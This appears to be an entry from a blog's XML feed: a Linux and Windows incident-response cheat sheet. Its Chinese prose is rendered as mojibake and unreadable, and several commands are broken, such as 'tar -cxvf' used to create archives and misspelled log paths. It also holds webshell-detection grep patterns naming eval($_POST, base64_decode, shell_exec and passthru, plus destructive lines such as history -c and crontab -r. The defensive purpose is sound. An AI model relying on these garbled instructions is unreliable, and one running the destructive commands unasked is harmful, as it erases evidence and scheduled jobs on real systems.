    <content type="text"><![CDATA[è¶ç€æœ€è¿‘ä¸æ˜¯å¾ˆå¿™ï¼Œæ•´ç†äº†ä¸‹æœ€è¿‘å­¦ä¹ çš„ä¸€äº›åº”æ€¥å“åº”çš„ä¸€äº›å‘½ä»¤ã€èµ„æ–™ï¼Œæ–¹ä¾¿ä»¥åæŸ¥çœ‹ï¼Œæœ‰ä»€ä¹ˆé—®é¢˜è¿˜æœ›æŒ‡å‡ºï¼Œå¤šå¤šäº¤æµï¼ 0.0 æ€ä¹ˆåšåº”æ€¥å“åº”ï¼Ÿå…·ä½“æ€ä¹ˆåšåº”æ€¥å“åº”ï¼Œæ ¹æ®ç½‘ä¸Šåº”æ€¥å“åº”çš„ç»éªŒæ€»ç»“å‡ ç‚¹ï¼š ç¡®å®šæ”»å‡»æ—¶é—´ æŸ¥æ‰¾æ”»å‡»çº¿ç´¢ æ¢³ç†æ”»å‡»æµç¨‹ å®æ–½è§£å†³æ–¹æ¡ˆ å®šä½æ”»å‡»è€… 123451ã€ç¡®å®šæ”»å‡»æ—¶é—´èƒ½å¤Ÿå¸®åŠ©æˆ‘ä»¬ç¼©å°åº”æ€¥å“åº”çš„èŒƒå›´ï¼Œæœ‰åŠ©äºæˆ‘ä»¬æé«˜æ•ˆç‡ï¼Œ2ã€æŸ¥æ‰¾æ”»å‡»çº¿ç´¢ï¼Œèƒ½å¤Ÿè®©æˆ‘ä»¬çŸ¥é“æ”»å‡»è€…éƒ½åšäº†ä»€ä¹ˆäº‹æƒ…ï¼Œ3ã€æ¢³ç†æ”»å‡»æµç¨‹åˆ™æ˜¯è¿˜åŸæ•´ä¸ªæ”»å‡»åœºæ™¯ï¼Œ4ã€å®æ–½è§£å†³æ–¹æ¡ˆå°±æ˜¯ä¿®å¤å®‰å…¨æ¼æ´ï¼Œåˆ‡æ–­æ”»å‡»é€”å¾„ï¼Œ5ã€æœ€åå°±æ˜¯å®šä½æ”»å‡»äººï¼Œåˆ™æ˜¯å–è¯ã€‚ å¸¸ç”¨å‘½ä»¤å…¨æ˜¯å¥—è·¯ï¼Œä½†ä¸€èˆ¬å¾ˆæœ‰ç”¨1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465661ã€å¤‡ä»½ç³»ç»Ÿæ—¥å¿—åŠé»˜è®¤çš„httpdæœåŠ¡æ—¥å¿—linux:tar -cxvf secure_logs.tar.gz /var/log/securetar -cxvf messages_logs.tar.gz /var/log/messegestar -cxvf httpd_logs.tar.gz /var/log/httpd/windows:åº”ç”¨ç¨‹åºæ—¥å¿—ã€ç³»ç»Ÿæ—¥å¿—ã€å®‰å…¨æ—¥å¿—ï¼›é»˜è®¤æƒ…å†µä¸‹ï¼Œå¦‚æœç³»ç»Ÿä¸å¯¹äº‹ä»¶åšå®¡æ ¸åˆ™ä¸ä¼šç”Ÿæˆå®‰å…¨æ—¥å¿—ã€‚å¼€å§‹â†’è®¾ç½®â†’æ§åˆ¶é¢æ¿â†’ç®¡ç†å·¥å…·â†’äº‹ä»¶æŸ¥çœ‹å™¨Windowsæ—¥å¿—æ–‡ä»¶é»˜è®¤ä½ç½®æ˜¯%systemroot%\system32\config å®‰å…¨æ—¥å¿—æ–‡ä»¶ï¼š%systemroot%\system32\config \SecEvent.EVT ç³»ç»Ÿæ—¥å¿—æ–‡ä»¶ï¼š%systemroot%\system32\config \SysEvent.EVT åº”ç”¨ç¨‹åºæ—¥å¿—æ–‡ä»¶ï¼š%systemroot%\system32\config \AppEvent.EVT FTPè¿æ¥æ—¥å¿—å’ŒHTTPDäº‹åŠ¡æ—¥å¿—ï¼š%systemroot% \system32\LogFiles\ IISæ—¥å¿—é»˜è®¤å­˜æ”¾åœ¨System32\LogFilesç›®å½•ä¸‹ï¼Œä½¿ç”¨W3Cæ‰©å±•æ ¼å¼2ã€å¤‡ä»½lastå¯ä»¥æŸ¥çœ‹ç™»å½•ä¿¡æ¯(ç™»å½•æ—¶é—´èƒ½ä¸èƒ½è·Ÿè¿ç»´äººå‘˜æ—¶é—´å¯¹ä¸Š)last &gt; last.log3ã€æŸ¥è¯¢utmpæ–‡ä»¶å¹¶æ˜¾ç¤ºå½“å‰ç³»ç»Ÿä¸­æ¯ä¸ªç”¨æˆ·å’Œå®ƒæ‰€è¿è¡Œçš„è¿›ç¨‹ä¿¡æ¯w &gt; w.log4ã€ç³»ç»ŸæœåŠ¡å¤‡ä»½chkconfig --list &gt; services.log5ã€æŸ¥çœ‹å¯ç–‘è¿›ç¨‹ linuxï¼šps -auxæˆ–ps -ef æŸ¥çœ‹è¿›ç¨‹æ–‡ä»¶è·¯å¾„ã€pidå·ï¼ˆä¸€èˆ¬ps -efèƒ½æ¯”è¾ƒæ¸…æ™°çš„çœ‹å‡ºåå¼¹shellï¼‰ps -auxçš„ç»“æœæ¯”è¾ƒæ‚ä¹±,pstree -açš„ç»“æœæ¯”è¾ƒç®€å•æ˜äº†lsof -i :port æ£€æŸ¥å“ªä¸ªè¿›ç¨‹ä½¿ç”¨è¿™ä¸ªç«¯å£lsof -p 1234 æ£€æŸ¥pidå·ä¸º1234è¿›ç¨‹è°ƒç”¨æƒ…å†µstrace -f -p 1234 è·Ÿè¸ªåˆ†æpidå·ä¸º1234çš„è¿›ç¨‹windowsï¼štasklist taskkill6ã€ç›‘å¬ç«¯å£å¤‡ä»½(æŸ¥çœ‹ç«¯å£åŠå¯¹åº”æœåŠ¡å¯¹å¤–å¼€æ”¾æƒ…å†µ)linux: netstat -antup &gt; port-listen.logwindows: netstat -ano &gt; port-listen.log7ã€æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯linuxï¼š cat /etc/passwdwindowsï¼š net user8ã€æŸ¥æ‰¾æœ€è¿‘5å¤©å†…æ›´æ”¹çš„æ–‡ä»¶find /home/work -type f -mtime -59ã€RootkitæŸ¥æ‰¾linux: Rootkit Hunterã€chkrootkitwindows: å‹’ç´¢è½¯ä»¶ç»ˆç»“è€…10ã€æŸ¥çœ‹æœåŠ¡å ç”¨èµ„æºæƒ…å†µtop &gt; top.log11ã€æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡(å¾ˆå¤šåé—¨ç¨‹åºé€šè¿‡crontabå®Œæˆè‡ªå¯)linuxï¼š crontab -lä¸è¿‡æœ‰æ—¶å€™crontab -lå¹¶ä¸èƒ½è§£å†³é—®é¢˜ï¼Œé€šå¸¸è¿˜è¦åšå¦‚ä¸‹æ“ä½œï¼šcd /etc/crontablscrontab -r åˆ é™¤è®¡åˆ’ä»»åŠ¡windowsï¼š ç®¡ç†-&gt;ä»»åŠ¡è®¡åˆ’ç¨‹åº-&gt;ä»»åŠ¡è®¡åˆ’ç¨‹åºåº“12ã€æŸ¥çœ‹æœ‰æ²¡æœ‰ææƒç—•è¿¹cat /etc/passwd ææœ‰å¯èƒ½å…¶ä»–ç”¨æˆ·å‡ºç°idï¼Œç»„id 0ã€0çš„æƒ…å†µlsof -g gidå· é€šå¸¸èƒ½æ‰¾åˆ°æ¶æ„æ–‡ä»¶å…³è”çš„libæ–‡ä»¶13ã€æ˜¾ç¤ºæœ€åç™»å½•ç³»ç»Ÿçš„å€’æ•°10æ¡è®°å½•last -1014ã€æŸ¥çœ‹æ‰§è¡Œè¿‡ä»€ä¹ˆå‘½ä»¤cat ~/.bash_historyhistory | grep &apos;2017-2-12&apos; æ ¹æ®æ—¶é—´æŸ¥çœ‹å¹²äº†ä»€ä¹ˆhistory | tail -n 5 æ˜¾ç¤ºæœ€è¿‘5æ¬¡æ‰§è¡Œçš„å‘½ä»¤history -c æ¸…ç©ºhistoryå†å²15ã€æŸ¥æ‰¾777çš„æƒé™çš„æ–‡ä»¶find / *.jsp -perm 77716ã€ç½‘ç»œè¿æ¥æŸ¥çœ‹ä¸è¯¥ipé“¾æ¥çš„è¿›ç¨‹åŠæ–‡ä»¶è·¯å¾„ã€pidå·netstat -anp| grep 8.8.8.8 linuxnetstat -ano|find &quot;8.8.8.8&quot; windows WEBæ–¹å¼å…¥ä¾µä¸»è¦é€šè¿‡webåº”ç”¨ç¨‹åºã€strust2ã€æ•°æ®åº“ç­‰å…¶ä»–é«˜å±æ¼æ´ä¾‹å¦‚apache12345678910111213141516171819apacheçš„é»˜è®¤é‡è¦é…ç½®ä¿¡æ¯å¦‚ä¸‹ï¼šé…ç½®æ–‡ä»¶ï¼š`/etc/httpd/conf/http.conf`æœåŠ¡å™¨çš„æ ¹ç›®å½•ï¼š`/var/www/html`è®¿é—®æ—¥å¿—æ–‡ä»¶ï¼š`/var/log/httpd/access_log`é”™è¯¯æ—¥å¿—æ–‡ä»¶ï¼š`/var/log/httpd/error_log`è¿è¡Œapacheçš„ç”¨æˆ·ï¼šapacheæ¨¡å—å­˜æ”¾è·¯å¾„ï¼š`/usr/lib/httpd/modules`1ã€æŸ¥çœ‹æ—¥å¿—æ–‡ä»¶2ã€æ ¹æ®æ—¥å¿—æ–‡ä»¶ä¿¡æ¯å®šä½æ¶æ„æ–‡ä»¶ä½ç½®3ã€`stat`è®°å½•æ¶æ„æ–‡ä»¶ä¿¡æ¯4ã€æ‰¾åˆ°æ¶æ„è¿›ç¨‹æ¯”å¦‚æ¶æ„è¿›ç¨‹åæ˜¯fu4k5ã€è¿›å…¥proc/å¯¹åº”pidç›®å½•/fdps -aux | grep fu4kcd /proc/fu4k/fdåœ¨/usr/binç›®å½•ä¸‹ï¼Œstatä¿¡æ¯ï¼šstat /usr/bin/fu4k6ã€æŸ¥æ‰¾ç³»ç»Ÿä¸­åŒ…å«æŒ‡å®šå­—ç¬¦çš„æ‰€æœ‰æ–‡ä»¶ï¼ˆå¯ä»¥æ‹¿å·²çŸ¥shellå¯†ç åŠç‰¹å®šå­—ç¬¦ä½œä¸ºå…³é”®å­—ï¼‰find /|xargs grep -ri &quot;caidao&quot; -l 2&gt; webshell.logï¼ˆæ‰§è¡Œåä¼šæ”¹å˜æ‰€æœ‰æ–‡ä»¶çš„atimeï¼‰ éwebæ–¹å¼å…¥ä¾µä¸»è¦é€šè¿‡bashå…¶ä»–é«˜å±æœåŠ¡ï¼Œå¤§å¤šå±äºssh(22)ã€vnc(5900)å¯¹å¤–ä¸”å¼±å£ä»¤çš„æƒ…å†µï¼Œä¸»è¦ç»“åˆsyslog/var/log/message.*åˆ¤æ–­123456781ã€åˆ¤æ–­æœåŠ¡å™¨æ˜¯å¦æ”¯æŒè®¿é—®å¤–ç½‘ï¼Œå¦‚æ”¯æŒï¼Œé€šè¿‡netstat â€“anæŸ¥çœ‹æ˜¯å¦å·²ä¸å¤–éƒ¨å¯ç–‘æœåŠ¡å™¨å»ºç«‹è¿æ¥ï¼Œå¦‚å·²å»ºç«‹éœ€åŠæ—¶æ–­å¼€2ã€è®°å½•åé—¨æ–‡ä»¶statä¿¡æ¯ï¼Œæ ¹æ®mtimeæŸ¥æ‰¾å…¶ä»–åé—¨æ–‡ä»¶ï¼ŒåŒæ—¶æ ¹æ®æ–‡ä»¶å±ç»„ä¸å±ç»„å¯¹åº”è¿è¡ŒæœåŠ¡åˆ¤æ–­å…¥ä¾µæ–¹å¼3ã€å¦‚æœæƒé™ç»„ä¸ºrootï¼Œéœ€è¦æ£€æµ‹æ˜¯å¦è¢«ç§rootkit4ã€éwebç±»åé—¨ï¼Œå¤§éƒ¨åˆ†äººä¹ æƒ¯æŠŠæ¶æ„æ–‡ä»¶æ”¾ç½®åœ¨`/tmp`ç›®å½•ä¸‹ï¼›5ã€é€šè¿‡å¯ç–‘è¿›ç¨‹åä¸cpuå ç”¨ç‡æ’æŸ¥ï¼Œæœ‰äº›åé—¨ä¼šä¼ªè£…æ­£å¸¸è¿›ç¨‹åï¼›ä½¿ç”¨`top`å‘½ä»¤æŸ¥çœ‹cpuå ç”¨ç‡ï¼Œæ‰¾å‡ºåé—¨è¿›ç¨‹6ã€è·å–è¿›ç¨‹pidåå¯cdåˆ°`/proc/å¯¹åº”pid/fd7ã€æŸ¥çœ‹æ˜¯å¦æœ‰ç›¸å…³è®¡åˆ’ä»»åŠ¡ï¼Œåé—¨ç¨‹åºä¸ºä¿è¯è‡ªå¯åŠ¨å¾€å¾€ä¼šæ·»åŠ æ–°çš„è®¡åˆ’ä»»åŠ¡ å…¥ä¾µåéœ€è¦è¢«å…³æ³¨çš„æ–‡ä»¶linux:123456789101112131415161718192021222324252627282930/var/log/messages â€” åŒ…æ‹¬æ•´ä½“ç³»ç»Ÿä¿¡æ¯ï¼Œå…¶ä¸­ä¹ŸåŒ…å«ç³»ç»Ÿå¯åŠ¨æœŸé—´çš„æ—¥å¿—ã€‚æ­¤å¤–ï¼Œmailï¼Œcronï¼Œdaemonï¼Œkernå’Œauthç­‰å†…å®¹ä¹Ÿè®°å½•åœ¨var/log/messagesæ—¥å¿—ä¸­ã€‚/var/log/dmesg â€” åŒ…å«å†…æ ¸ç¼“å†²ä¿¡æ¯ï¼ˆkernel ring bufferï¼‰ã€‚åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶ï¼Œä¼šåœ¨å±å¹•ä¸Šæ˜¾ç¤ºè®¸å¤šä¸ç¡¬ä»¶æœ‰å…³çš„ä¿¡æ¯ã€‚å¯ä»¥ç”¨dmesgæŸ¥çœ‹å®ƒä»¬ã€‚/var/log/auth.log â€” åŒ…å«ç³»ç»Ÿæˆæƒä¿¡æ¯ï¼ŒåŒ…æ‹¬ç”¨æˆ·ç™»å½•å’Œä½¿ç”¨çš„æƒé™æœºåˆ¶ç­‰ã€‚/var/log/boot.log â€” åŒ…å«ç³»ç»Ÿå¯åŠ¨æ—¶çš„æ—¥å¿—ã€‚/var/log/daemon.log â€” åŒ…å«å„ç§ç³»ç»Ÿåå°å®ˆæŠ¤è¿›ç¨‹æ—¥å¿—ä¿¡æ¯ã€‚/var/log/dpkg.log â€“ åŒ…æ‹¬å®‰è£…æˆ–dpkgå‘½ä»¤æ¸…é™¤è½¯ä»¶åŒ…çš„æ—¥å¿—ã€‚/var/log/kern.log â€“ åŒ…å«å†…æ ¸äº§ç”Ÿçš„æ—¥å¿—ï¼Œæœ‰åŠ©äºåœ¨å®šåˆ¶å†…æ ¸æ—¶è§£å†³é—®é¢˜ã€‚/var/log/lastlog â€” è®°å½•æ‰€æœ‰ç”¨æˆ·çš„æœ€è¿‘ä¿¡æ¯ã€‚è¿™ä¸æ˜¯ä¸€ä¸ªASCIIæ–‡ä»¶ï¼Œå› æ­¤éœ€è¦ç”¨lastlogå‘½ä»¤æŸ¥çœ‹å†…å®¹ã€‚/var/log/maillog /var/log/mail.log â€” åŒ…å«æ¥ç€ç³»ç»Ÿè¿è¡Œç”µå­é‚®ä»¶æœåŠ¡å™¨çš„æ—¥å¿—ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼Œsendmailæ—¥å¿—ä¿¡æ¯å°±å…¨éƒ¨é€åˆ°è¿™ä¸ªæ–‡ä»¶ä¸­ã€‚/var/log/user.log â€” è®°å½•æ‰€æœ‰ç­‰çº§ç”¨æˆ·ä¿¡æ¯çš„æ—¥å¿—ã€‚/var/log/Xorg.x.log â€” æ¥è‡ªXçš„æ—¥å¿—ä¿¡æ¯ã€‚/var/log/alternatives.log â€“ æ›´æ–°æ›¿ä»£ä¿¡æ¯éƒ½è®°å½•åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­ã€‚/var/log/btmp â€“ è®°å½•æ‰€æœ‰å¤±è´¥ç™»å½•ä¿¡æ¯ã€‚ä½¿ç”¨lastå‘½ä»¤å¯ä»¥æŸ¥çœ‹btmpæ–‡ä»¶ã€‚ä¾‹å¦‚ï¼Œâ€last -f /var/log/btmp | moreâ€œã€‚/var/log/cups â€” æ¶‰åŠæ‰€æœ‰æ‰“å°ä¿¡æ¯çš„æ—¥å¿—ã€‚/var/log/anaconda.log â€” åœ¨å®‰è£…Linuxæ—¶ï¼Œæ‰€æœ‰å®‰è£…ä¿¡æ¯éƒ½å‚¨å­˜åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­ã€‚/var/log/yum.log â€” åŒ…å«ä½¿ç”¨yumå®‰è£…çš„è½¯ä»¶åŒ…ä¿¡æ¯ã€‚/var/log/cron â€” æ¯å½“cronè¿›ç¨‹å¼€å§‹ä¸€ä¸ªå·¥ä½œæ—¶ï¼Œå°±ä¼šå°†ç›¸å…³ä¿¡æ¯è®°å½•åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­ã€‚/var/log/secure â€” åŒ…å«éªŒè¯å’Œæˆæƒæ–¹é¢ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼Œsshdä¼šå°†æ‰€æœ‰ä¿¡æ¯è®°å½•ï¼ˆå…¶ä¸­åŒ…æ‹¬å¤±è´¥ç™»å½•ï¼‰åœ¨è¿™é‡Œã€‚/var/log/wtmpæˆ–/var/log/utmp â€” åŒ…å«ç™»å½•ä¿¡æ¯ã€‚ä½¿ç”¨wtmpå¯ä»¥æ‰¾å‡ºè°æ­£åœ¨ç™»é™†è¿›å…¥ç³»ç»Ÿï¼Œè°ä½¿ç”¨å‘½ä»¤æ˜¾ç¤ºè¿™ä¸ªæ–‡ä»¶æˆ–ä¿¡æ¯ç­‰ã€‚/var/log/faillog â€“ åŒ…å«ç”¨æˆ·ç™»å½•å¤±è´¥ä¿¡æ¯ã€‚æ­¤å¤–ï¼Œé”™è¯¯ç™»å½•å‘½ä»¤ä¹Ÿä¼šè®°å½•åœ¨æœ¬æ–‡ä»¶ä¸­ã€‚é™¤äº†ä¸Šè¿°Logæ–‡ä»¶ä»¥å¤–ï¼Œ /var/logè¿˜åŸºäºç³»ç»Ÿçš„å…·ä½“åº”ç”¨åŒ…å«ä»¥ä¸‹ä¸€äº›å­ç›®å½•ï¼š/var/log/httpd/æˆ–/var/log/apache2 â€” åŒ…å«æœåŠ¡å™¨access_logå’Œerror_logä¿¡æ¯ã€‚/var/log/lighttpd/ â€” åŒ…å«light HTTPDçš„access_logå’Œerror_logã€‚/var/log/mail/ â€“ è¿™ä¸ªå­ç›®å½•åŒ…å«é‚®ä»¶æœåŠ¡å™¨çš„é¢å¤–æ—¥å¿—ã€‚/var/log/prelink/ â€” åŒ…å«.soæ–‡ä»¶è¢«prelinkä¿®æ”¹çš„ä¿¡æ¯ã€‚/var/log/audit/ â€” åŒ…å«è¢« Linux audit daemonå‚¨å­˜çš„ä¿¡æ¯ã€‚/var/log/samba/ â€“ åŒ…å«ç”±sambaå­˜å‚¨çš„ä¿¡æ¯ã€‚/var/log/sa/ â€” åŒ…å«æ¯æ—¥ç”±sysstatè½¯ä»¶åŒ…æ”¶é›†çš„saræ–‡ä»¶ã€‚/var/log/sssd/ â€“ ç”¨äºå®ˆæŠ¤è¿›ç¨‹å®‰å…¨æœåŠ¡ã€‚~/.bash_history è‡³å…³é‡è¦çš„æ—¥å¿—ï¼Œå¾€å¾€é»‘å®¢ä¼šä½¿ç”¨history -cæ¸…ç†ç›¸å…³çš„æ—¥å¿— å…¥ä¾µåwebæœåŠ¡å™¨æ—¥å¿—åˆ†æwebæœåŠ¡å™¨çš„ç§ç±»å¾ˆå¤šï¼Œæ¥è§¦æ¯”è¾ƒå¤šçš„ä¸ºapacheã€tomcatã€nagixä¸ºä¸»ã€‚æ— è®ºä»»ä½•webæœåŠ¡å™¨å…¶å®æ—¥å¿—éœ€è¦å…³æ³¨çš„ä¸œè¥¿æ˜¯ä¸€è‡´çš„ï¼Œå³access_logå’Œerror_logã€‚æŸ¥çœ‹å“ªäº›IPåœ¨æš´åŠ›ç ´è§£root123grep &quot;Failed password for root&quot; /var/log/auth.log | awk &apos;&#123;print $11&#125;&apos; | sort | uniq -c | sort -nr | morecat /var/log/messeges|grep rootcat /var/log/messages |grep &apos;root from&apos; | wc -l æŸ¥çœ‹çˆ†ç ´æ¬¡æ•° ä¸€èˆ¬ç¡®å®šipåœ°å€åï¼Œé€šè¿‡:123find . access_log |grep xargs ipæ”»å‡»åœ°å€find . access_log| grep xargs æœ¨é©¬æ–‡ä»¶åtail -F /var/log/httpd/error_log | grep ipæ”»å‡»åœ°å€ åŠ¨æ€æŸ¥çœ‹æ—¥å¿— é€šè¿‡access_logå’Œerror_logä¸­çš„æ•°æ®æˆ‘ä»¬ä¸€èˆ¬èƒ½æ˜ç¡®ä»¥ä¸‹å‡ ä»¶äº‹æƒ…ï¼š æ–‡ä»¶æ˜¯ä»€ä¹ˆæ—¶åˆ»ä¸Šä¼ çš„ï¼Œåº”æ€¥å“åº”ä¸­ç¡®å®šæ”»å‡»å‘ç”Ÿçš„æ”»å‡»ç‚¹ååˆ†é‡è¦ã€‚é€šè¿‡æ—¶é—´ç‚¹å¯ä»¥æœ‰æ•ˆçš„æŸ¥æ‰¾åŠ å¯†æœ¨é©¬ï¼Œéšè”½çš„åé—¨ç­‰ã€‚ æ”»å‡»çš„IPåœ°å€æ˜¯å¤šå°‘ï¼Œå½“ç„¶ä¸€èˆ¬æƒ…å†µæ˜¯è·³æ¿åœ°å€T_T ä¼ äº†ä»€ä¹ˆæ–‡ä»¶ä¸Šæ¥ ç­›é€‰æŒ‡å®šIPè®¿é—®çš„URLï¼Œå¹¶æŒ‰ç…§è®¿é—®æ•°é‡æ’åºcat access.log |grep &quot;192.168.11.37&quot; | awk &#39;{print $7}&#39; | sort | uniq -c |sort -nrç­›é€‰å‡ºè®¿é—®çŠ¶æ€ç æ˜¯500çš„æ‰€æœ‰IPåœ°å€ï¼Œå¹¶æŒ‰ç…§è®¿é—®æ¬¡æ•°æ’åºcat access.log |grep &quot;HTTP/1.1\&quot; 500&quot; | awk &#39;{print $1}&#39; | sort | uniq -c |sort -nr ç­›é€‰/var/log/secureæ—¥å¿—æ‰¾åˆ°çˆ†ç ´sshçš„ipcat /var/log/secure |grep &#39;Accepted password&#39;æŸ¥çœ‹cronæ—¥å¿—1234/etc/cron.hourly/cron.sh/etc/cron.hourly/udev.shæŸ¥çœ‹ç¬¬ä¸€æ¬¡è®¡åˆ’ä»»åŠ¡æ—¶é—´ï¼šcat /var/log/cron |grep &apos;æ¶æ„æ–‡ä»¶å&apos;|sort|head windows:1234567x:\RECYCLER\C:\Documents and Settings\c:\users\c:\windows\temp\IISçš„é»˜è®¤ä¸Šä¼ ç›®å½•æ—¥å¿—åˆ†æå·¥å…·ï¼š[Webæ—¥å¿—å®‰å…¨åˆ†æå·¥å…· v2.0.exe]() åº”ç”¨ç³»ç»Ÿæ—¥å¿—1234MySQL; åœ¨mysql.logæ‰¾é”™è¯¯æ¶ˆæ¯ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰ç»“æ„æŸåçš„è¡¨ï¼Œ æ˜¯å¦æœ‰innodbä¿®å¤è¿›ç¨‹åœ¨è¿è¡Œï¼Œæ˜¯å¦æœ‰disk/index/query é—®é¢˜.PHP-FPM; å¦‚æœè®¾å®šäº† php-slow æ—¥å¿—, ç›´æ¥æ‰¾é”™è¯¯ä¿¡æ¯ (php, mysql, memcache, â€¦)ã€‚Varnish; åœ¨varnishlog å’Œ varnishstat é‡Œ, æ£€æŸ¥ hit/missæ¯”. çœ‹çœ‹é…ç½®ä¿¡æ¯é‡Œæ˜¯å¦é—æ¼äº†ä»€ä¹ˆè§„åˆ™ï¼Œä½¿æœ€ç»ˆç”¨æˆ·å¯ä»¥ç›´æ¥æ”»å‡»ä½ çš„åç«¯ï¼ŸHA-Proxy; åç«¯çš„çŠ¶å†µå¦‚ä½•ï¼Ÿå¥åº·çŠ¶å†µæ£€æŸ¥æ˜¯å¦æˆåŠŸï¼Ÿæ˜¯å‰ç«¯è¿˜æ˜¯åç«¯çš„é˜Ÿåˆ—å¤§å°è¾¾åˆ°æœ€å¤§å€¼äº†ï¼Ÿ å…¥ä¾µåæ¶æ„æ–‡ä»¶æŸ¥æ‰¾1234567891011121314151617181920212223find -mtime -2 -type f -name \*.php æŸ¥æ‰¾è¿‘2å¤©è¢«ä¿®æ”¹è¿‡çš„æ–‡ä»¶find /app -user root æŸ¥æ‰¾appç›®å½•ä¸‹å±äºrootç”¨æˆ·çš„æ–‡ä»¶æŸ¥æ‰¾å­˜åœ¨åˆ¶å®šå…³é”®å­—çš„æ¶æ„è„šæœ¬æœ¨é©¬find ./ -name &quot;*.php&quot; |xargs egrep &quot;phpspy|c99sh|milw0rm|eval\(gunerpress|eval\(base64_decode|spider_bc&quot;&gt; /tmp/php.txtgrep -r --include=*.php &apos;[^a-z]eval($_POST&apos; . &gt; /tmp/eval.txtgrep -r --include=*.php &apos;file_put_contents(.*$_POST\[.*\]);&apos; . &gt; /tmp/file_put_contents.txtfind ./ -name &quot;*.php&quot; -type f -print0 | xargs -0 egrep &quot;(phpspy|c99sh|milw0rm|eval\(gzuncompress\(base64_decode|eval\(base64_decode|spider_bc|gzinflate)&quot; | awk -F: &apos;&#123;print $1&#125;&apos; | sort | uniqlinux ä¸‹webshellæŸ¥æ€ï¼šfind /www/ -name &quot;*.php&quot; |xargs egrep &apos;assert|phpspy|c99sh|milw0rm|eval|\(gunerpress|\(base64_decoolcode|spider_bc|shell_exec|passthru|\(\$\_\POST\[|eval \(str_rot13|\.chr\(|\$\&#123;\&quot;\_P|eval\(\$\_R|file_put_contents\(\.\*\$\_|base64_decode&apos;æŸ¥æ€è„šæœ¬ï¼š[webshellæŸ¥æ€è„šæœ¬.py]()[webshellkill_linux.py]()rootkitæŸ¥æ‰¾windowsä¸‹ï¼š[PC Hunter]http://www.xuetr.com/)[PowerTool] (http://about.me/ithurricanept)linuxä¸‹ï¼š[Rootkit Hunter](http://rkhunter.sourceforge.net/)å¸¸è§„åé—¨æŸ¥æ‰¾shiftåé—¨ç­‰[Dç›¾_WebæŸ¥æ€](http://d99net.net/News.asp?id=62)[Safe3 WebShell Scanner](http://www.273tech.com/works/884981847/view.htm)[æš—ç»„Webæ€æ¯’ 2.6](http://forum.cnsec.org/thread-93025-1-1.html) å…¶ä»–æ–¹é¢æ£€æµ‹ ç½‘ç»œç›¸å…³ å¼‚å¸¸æµé‡ DDOS ARP DNS æ•°æ®åº“ å¸¸è§é—®é¢˜å…³é”®æ–‡ä»¶è®¾ç½®ä½¿ç”¨chattrå‘½ä»¤é˜²æ­¢ç³»ç»Ÿä¸­æŸä¸ªå…³é”®æ–‡ä»¶è¢«ä¿®æ”¹ï¼šchattr +i /etc/resolv.confæŸ¥çœ‹ä½¿ç”¨ï¼šlsattr /etc/resolv.confä¼šæ˜¾ç¤ºå¦‚ä¸‹å±æ€§ â€”-iâ€”â€”â€“ /etc/resolv.conf è¦æƒ³ä¿®æ”¹æ­¤æ–‡ä»¶å°±è¦æŠŠiå±æ€§å»æ‰ï¼š chattr -i /etc/resolv.confè®©æŸä¸ªæ–‡ä»¶åªèƒ½å¾€é‡Œé¢è¿½åŠ æ•°æ®ï¼Œä½†ä¸èƒ½åˆ é™¤(ç”¨äºå„ç§æ—¥å¿—æ–‡ä»¶ä¸Š)ï¼šchattr +a /var/log/messagesç³»ç»Ÿå‘½ä»¤è¢«æ›¿æ¢ 1ã€å¯ä»¥é€‰æ‹©é‡æ–°è¿˜åŸå›å»:yum install e2fsprogs;2ã€ä¹Ÿå¯ä»¥ä½¿ç”¨ç³»ç»Ÿå‘½ä»¤å·¥å…·åŒ…busyboxï¼Œæœ€åbusybox è¦è¿˜åŸçš„å‘½ä»¤ -iæ—¥å¿—æŸ¥çœ‹/var/log/secureæ—¥å¿—å¯ä»¥æŸ¥çœ‹Acceptå…³é”®å­—;æŸ¥æ‰¾è®¿é—®å’Œé”™è¯¯æ—¥å¿—, ç›´æ¥æ‰¾5xxé”™è¯¯, å†çœ‹çœ‹æ˜¯å¦æœ‰limit_zoneé”™è¯¯; æ—¥å¿—æ–‡ä»¶æ¢å¤linuxä¸‹æ—¥å¿—æ–‡ä»¶æ¢å¤å¯ä½¿ç”¨lsofæ¢å¤åˆ é™¤çš„æ—¥å¿—æ–‡ä»¶(å‰ææ˜¯ä¸èƒ½å…³é—­æœåŠ¡å™¨ï¼Œä¸èƒ½å…³é—­ç›¸å…³æœåŠ¡æˆ–è¿›ç¨‹)12lsof | grep access_logcat /proc/$PID/fd/$æ–‡ä»¶æè¿°ç¬¦ &gt; /var/log/httpd/access_log éƒ¨åˆ†å‘½ä»¤æ— æ³•æ‰§è¡Œ å½“ç”¨æˆ·ç¯å¢ƒå˜é‡é…ç½®ä¸å½“æ—¶ï¼Œéƒ¨åˆ†å‘½ä»¤æ— æ³•ç›´æ¥æ‰§è¡Œï¼Œéœ€è¦åœ¨å‘½ä»¤ä¹‹å‰åŠ ä¸Šè·¯å¾„ï¼Œå¦‚ï¼š/etc/sbin/ifconfig]]></content>
      <tags>
        <tag>è¿ç»´</tag>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>è‡ªåŠ¨åŒ–</tag>
        <tag>webshell</tag>
        <tag>linux</tag>
        <tag>åº”æ€¥å“åº”</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å…³äºMongoDBæœªæˆæƒè®¿é—®çš„å­¦ä¹ ]]></title>
    <url>%2F2017%2F01%2F13%2F%E5%85%B3%E4%BA%8EMongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E7%9A%84%E5%AD%A6%E4%B9%A0%2F</url>
